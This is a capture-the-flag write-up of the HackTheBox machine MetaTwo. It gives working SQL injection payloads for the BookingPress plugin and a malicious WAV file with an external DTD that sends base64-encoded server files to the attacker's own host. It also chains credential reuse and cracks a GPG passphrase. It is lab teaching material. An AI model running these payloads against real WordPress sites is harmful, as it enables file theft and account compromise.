---
layout: post
title: "HTB: MetaTwo"
subtitle: "BookingPress unauth SQLi to crack a manager, WordPress XXE to read wp-config FTP creds, then a passpie GPG store to root"
date: 2023-02-02
tags: [htb, linux, wordpress, sqli, xxe]
category: writeups
kind: machine
tldr: "An unauthenticated SQL injection in the BookingPress WordPress plugin (CVE-2022-0739) dumps password hashes and I crack the manager. An authenticated Media Library XXE (CVE-2021-29447) reads wp-config.php for the FTP password, which leads to send_email.php and jnelson's SSH creds. Root comes from a passpie GPG store cracked with gpg2john."
---

## the box

MetaTwo is an easy Linux box that chains two named CVEs cleanly. An unauthenticated plugin SQLi hands me a WordPress manager account, and authentication is the precondition for the next bug, an XXE in the media uploader. The XXE is a file-read primitive, so its whole value is knowing which files to read: wp-config first for FTP, then chasing reused credentials from FTP to SMTP to SSH. Root is a password manager whose master passphrase is in rockyou. Target was `10.10.11.186`.

## recon

Full sweep, then scripts and versions:

```bash
nmap -p- --min-rate 10000 10.10.11.186
nmap -p 21,22,80 -sCV 10.10.11.186
```

Three ports:

```
21/tcp open  ftp     ProFTPD Server (Debian)
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
|_http-server-header: nginx/1.18.0
```

FTP is open but anonymous login was off, so it is a target for credentials later, not an entry. Port 80 redirects to `http://metapress.htb/`, so I added the host:

```
10.10.11.186 metapress.htb
```

The site is WordPress. `wpscan` and the page source pinned it down:

```
CMS: WordPress 5.6.2
theme: twentytwentyone (version 1.1)
user: admin
```

The navigation had an `/events` page that books appointments. After booking, it redirected to:

```
http://metapress.htb/thank-you/?appointment_id=NQ==
```

`NQ==` base64-decodes to `5`, so appointment IDs are just base64'd integers. The booking widget on `/events/` is the **BookingPress** plugin, around version `1.0.10`. That version has a public unauthenticated SQLi.

BookingPress `1.0.10` is vulnerable to **CVE-2022-0739** (fixed in `1.0.11`): an unauthenticated UNION-based SQL injection in the `bookingpress_front_get_category_services` AJAX action. The injectable parameter is `total_service`, and the query exposes 9 columns, so a UNION needs exactly nine selected values.

The one catch is the action needs a valid `_wpnonce`. WordPress sprays nonces into front-end JS, and this one sits in the `/events/` page source right next to the AJAX call. Grepping the source for `bookingpress_front_get_category_services` finds it:

```
action:'bookingpress_front_get_category_services'
_wpnonce:'f071f53b5a'
```

A raw request looks like this, with a `-7502)` prefix to break out and the nine-column UNION fingerprinting the database:

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

action=bookingpress_front_get_category_services&_wpnonce=f071f53b5a&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -
```

## foothold

With the nonce I ran the public PoC, which automates the version fingerprint and then dumps `wp_users`:

```bash
python3 booking-press-expl.py -u http://metapress.htb -n 'f071f53b5a'
```

The core of that script is two payloads, a count trigger and a per-row gainer, both keeping the nine-column UNION shape:

```python
trigger = ") UNION ALL SELECT @@VERSION,2,3,4,5,6,7,count(*),9 from wp_users-- -"
gainer  = ') UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users limit 1 offset {off}-- -'
```

It dumped the WordPress user hashes:

```
|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|
|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|
```

`sqlmap -r sqli.req -p total_service -D blog -T wp_users --dump` reaches the same data if you would rather not run the script.

Both are phpass (`$P$`) hashes. John cracked the manager:

```bash
john wp.hashes --wordlist=/usr/share/wordlists/rockyou.txt --user
```

```
manager:partylikearockstar
```

admin never fell. `manager:partylikearockstar` logged into `/wp-admin`. A manager has the Media Library, which is the foothold for the next CVE.

WordPress `5.6.2` is vulnerable to **CVE-2021-29447**, an XXE in the media uploader. WP parses audio metadata with the PHP `getID3` library, and a WAV file can carry an `iXML` chunk holding arbitrary XML. The parser processes that XML, so an external entity reference reaches out, pulls a remote DTD, and exfiltrates a file. It needs an authenticated user who can upload, which is exactly what the cracked manager account gives.

The malicious WAV declares a parameter entity that fetches my DTD, then triggers the chain:

```wav
RIFFWAVEiXML{<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://10.10.16.36:8484/evil.dtd'>%remote;%init;%trick;] >
```

The raw file is a tiny RIFF header, an `iXML` chunk whose length is `0x7b` bytes, and the XML inline. The hex makes the structure obvious:

```
00000000: 5249 4646 b800 0000 5741 5645 6958 4d4c  RIFF....WAVEiXML
00000010: 7b00 0000 3c3f 786d 6c20 7665 7273 696f  {...<?xml versio
...
00000070: 6427 3e25 7265 6d6f 7465 3b25 696e 6974  d'>%remote;%init
00000080: 3b25 7472 6963 6b3b 5d20 3e00            ;%trick;] >.
```

`evil.dtd`, hosted on my box, base64-encodes the target file with a PHP filter and exfiltrates it as a query string parameter (nesting the entity so the file contents land in a follow-up request):

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.16.36:8484/?p=%file;'>" >
```

I served the DTD and a catcher (`python3 -m http.server 8484`), uploaded the WAV through `Media > Add New`, and the box requested `evil.dtd` then sent back `/etc/passwd` base64-encoded on the `?p=` parameter. Decoding it confirmed the local user:

```
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
```

No SSH key came back for jnelson, so I aimed the file-read at config. The nginx vhost gave the webroot:

```bash
# point evil.dtd at /etc/nginx/sites-enabled/default
```

```nginx
server {
    listen 80;
    root /var/www/metapress.htb/blog;
    index index.php index.html;
    ...
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
    }
}
```

So the WordPress root is `/var/www/metapress.htb/blog`. I re-fired the XXE at `/var/www/metapress.htb/blog/wp-config.php`.

## user

`wp-config.php` carried both the database credentials and, more usefully, FTP credentials, because WordPress was configured to push updates over FTP (`FS_METHOD = ftpext`):

```php
define( 'DB_NAME', 'blog' );
define( 'DB_USER', 'blog' );
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );
define( 'DB_HOST', 'localhost' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );
```

The FTP creds opened the ProFTPD service from port 21:

```bash
ftp metapress.htb@metapress.htb   # 9NYS_ii@FyL_p5M2NvJ
```

Alongside `blog/` was a `mailer/` directory holding `send_email.php`, a PHPMailer script with hardcoded SMTP credentials for jnelson:

```php
$mail->Host     = "mail.metapress.htb";
$mail->Username = "jnelson@metapress.htb";
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";
$mail->Port     = 587;
```

Those SMTP credentials are reused for SSH, which is the kind of reuse this box keeps rewarding:

```bash
ssh jnelson@10.10.11.186   # Cb4_JmWM8zUZWMu@Ys
```

That gave the user flag.

## root

In jnelson's home was a `.passpie` directory, the file store for the **passpie** command-line password manager. It keeps each credential as a PGP-encrypted YAML file, with the PGP keypair in a hidden `.passpie/.keys`. The `ssh` entry held root's password as a PGP message:

```
.passpie/
├── .config
├── .keys          # PGP private + public key blocks
└── ssh.pass       # root@ssh entry, PGP-encrypted password
```

The `root@ssh` entry:

```yaml
fullname: root@ssh
login: root
name: ssh
password: '-----BEGIN PGP MESSAGE-----
  ...
  -----END PGP MESSAGE-----'
```

To decrypt it I needed the private key's passphrase. I copied `.keys` over, removed the public-key block, and turned the private key into a crackable hash:

```bash
scp jnelson@10.10.11.186:/home/jnelson/.passpie/.keys .
gpg2john .keys > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

John recovered the passphrase:

```
blink182
```

That is not the root password, it is the passphrase that unlocks the passpie store. Back on the box, I exported the vault with it. Either `export` to a YAML file or a direct `copy` to stdout works:

```bash
passpie export pass.yml --passphrase blink182
# or
passpie --passphrase blink182 copy --to stdout root@ssh
```

The export revealed the root SSH password:

```
fullname: root@ssh
login: root
password: !!python/unicode 'p7qfAZt4_A1xo_0x'
```

`su` with that finished the box:

```bash
su -   # p7qfAZt4_A1xo_0x
```

That gave the root flag.

## takeaway

Two known CVEs chain cleanly, and the order is the lesson: the SQLi exists only to produce an authenticated session, and that session is the precondition for the XXE. The XXE itself is just a file-read, so it is worth nothing without knowing what to read, wp-config first because it holds FTP creds, then a credential chase from FTP to SMTP to SSH that works only because the same human reused one password three times. The root step is the same idea one layer down. A password manager protects you exactly as well as its master passphrase, and `blink182` is in rockyou, so the vault was a speed bump, not a lock.
